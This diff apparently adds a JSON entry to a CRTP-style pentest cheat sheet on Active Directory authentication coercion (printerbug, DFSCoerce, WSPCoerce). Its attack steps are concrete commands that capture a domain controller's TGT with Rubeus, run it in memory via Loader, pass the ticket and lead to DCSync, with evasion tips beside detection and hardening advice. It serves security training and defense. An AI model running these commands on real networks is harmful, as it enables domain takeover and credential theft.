@@ -1,0 +1,118 @@
+{
+  "id": "crtp-coercion",
+  "name": "Authentication Coercion (MS-RPRN / DFSCoerce / WSPCoerce)",
+  "command": "MS-RPRN.exe \\\\<target_dc_fqdn> \\\\<listener_host_fqdn>",
+  "description": "Force a target machine (often a DC) to authenticate to a host you control by triggering RPC methods over the Print System (MS-RPRN 'printerbug'), DFS Namespace (MS-DFSNM, DFSCoerce), or WSP (WSPCoerce) protocols. When the listener is an Unconstrained Delegation host running Rubeus monitor, you capture the coerced machine's TGT.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Lateral Movement",
+  "type": "command",
+  "certifications": [
+    "CRTP"
+  ],
+  "source": "CRTP",
+  "opsec": "loud",
+  "mitre": [
+    "T1187"
+  ],
+  "tools": [
+    "MS-RPRN.exe",
+    "DFSCoerce",
+    "WSPCoerce",
+    "Rubeus"
+  ],
+  "tags": [
+    "coercion",
+    "printerbug",
+    "dfscoerce",
+    "forced-authentication",
+    "unconstrained-delegation",
+    "crtp"
+  ],
+  "variations": [
+    {
+      "label": "DFSCoerce",
+      "command": "DFSCoerce-andrea.exe -t <target_dc> -l <listener_host>"
+    },
+    {
+      "label": "WSPCoerce (via Loader, in-memory)",
+      "command": "Loader.exe -path C:\\AD\\tools\\WSPCoerce.exe -args <TARGET_DC> <LISTENER_HOST>"
+    }
+  ],
+  "steps": [
+    {
+      "label": "On the unconstrained-delegation host, start the TGT monitor",
+      "command": "C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap"
+    },
+    {
+      "label": "Coerce the DC to authenticate to it (printerbug)",
+      "command": "C:\\AD\\Tools\\MS-RPRN.exe \\\\dcorp-dc.dollarcorp.moneycorp.local \\\\dcorp-appsrv.dollarcorp.moneycorp.local"
+    },
+    {
+      "label": "Or DFSCoerce",
+      "command": "C:\\AD\\Tools\\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv"
+    },
+    {
+      "label": "Rubeus captures DCORP-DC$ TGT -> ptt and DCSync",
+      "command": "C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args ptt /ticket:<base64_tgt>"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Cross-forest coercion (moneycorp DC)",
+      "command": "C:\\AD\\Tools\\MS-RPRN.exe \\\\mcorp-dc.moneycorp.local \\\\dcorp-appsrv.dollarcorp.moneycorp.local"
+    },
+    {
+      "label": "DFSCoerce cross-forest",
+      "command": "C:\\AD\\Tools\\DFSCoerce-andrea.exe -t mcorp-dc.moneycorp.local -l dcorp-appsrv.dollarcorp.moneycorp.local"
+    }
+  ],
+  "notes": "Coercion is the trigger half of the unconstrained-delegation attack: the listener must be a host with unconstrained delegation running Rubeus monitor (crtp-unconstrained-delegation). MS-RPRN needs the Print Spooler running on the target; if patched/disabled, fall back to DFSCoerce (MS-DFSNM) or WSPCoerce. A captured DC machine-account TGT enables DCSync / silver tickets. Also relevant to RBCD and ADCS ESC8 relay chains.",
+  "references": [
+    {
+      "title": "CRTP - Attacking and Defending AD (lab)",
+      "url": "https://www.alteredsecurity.com/adlab"
+    },
+    {
+      "title": "MITRE ATT&CK T1187 - Forced Authentication",
+      "url": "https://attack.mitre.org/techniques/T1187/"
+    },
+    {
+      "title": "DFSCoerce (GitHub)",
+      "url": "https://github.com/Wh04m1001/DFSCoerce"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-unconstrained-delegation",
+      "note": "The listener must be an unconstrained-delegation host running Rubeus monitor",
+      "rel": "prereq"
+    },
+    {
+      "id": "crtp-dcsync",
+      "note": "Use the captured DC$ TGT to DCSync",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-silver-ticket",
+      "note": "DC machine hash also enables silver tickets for its services",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "prerequisites": "A host with Unconstrained Delegation under attacker control running a TGT monitor; network reach to the target over the coercion protocol (RPC 445/135); a domain account to authenticate the RPC call.",
+    "why_it_works": "MS-RPRN (RpcRemoteFindFirstPrinterChangeNotificationEx), MS-DFSNM, and WSP expose RPC methods that make the server connect back to an attacker-supplied UNC/host, authenticating with its machine account. If the callback lands on an unconstrained-delegation host, the machine's full TGT is cached there and can be extracted.",
+    "misconfiguration": "Print Spooler running on DCs; unconstrained delegation configured on non-DC hosts; coercible RPC interfaces reachable; no SMB signing / no Extended Protection for Authentication.",
+    "impact": "Capture of a Domain Controller's machine-account TGT -> DCSync, silver tickets for the DC's services, and effectively domain compromise.",
+    "detection": "Inbound RPC to spoolss / MS-DFSNM from unusual hosts; a DC authenticating (Kerberos TGS/AS or NTLM) to a member server it never normally contacts; Event 4624/4769 for a DC machine account against a workstation; EDR alerts on printerbug/DFSCoerce signatures.",
+    "artifacts": "Spooler/DFS RPC connection logs; anomalous machine-account authentication to the listener; Rubeus monitor output on the listener host.",
+    "vulnerable_config": "# Print Spooler = Running on Domain Controllers\n# Unconstrained delegation on a non-DC (msDS-... / userAccountControl TRUSTED_FOR_DELEGATION)\n# SMB signing not required; EPA off",
+    "secure_config": "# Disable Print Spooler on DCs and servers that don't print\n# Remove unconstrained delegation; use constrained/RBCD or none\n# Require SMB signing and enable Extended Protection for Authentication\n# Add DCs to 'Protected Users' / mark accounts 'sensitive, cannot be delegated'",
+    "prevention": "Disable Print Spooler on DCs; eliminate unconstrained delegation; require SMB signing + EPA; mark privileged/computer accounts as non-delegable; monitor coercion RPC. [MITRE M1042, M1041, M1037]",
+    "evasion": "Choose whichever coercion protocol is unpatched (printerbug vs DFSCoerce vs WSPCoerce); trigger briefly to grab one TGT and stop the monitor to limit noise.",
+    "sources": [
+      "CRTP",
+      "MITRE T1187"
+    ]
+  }
+}
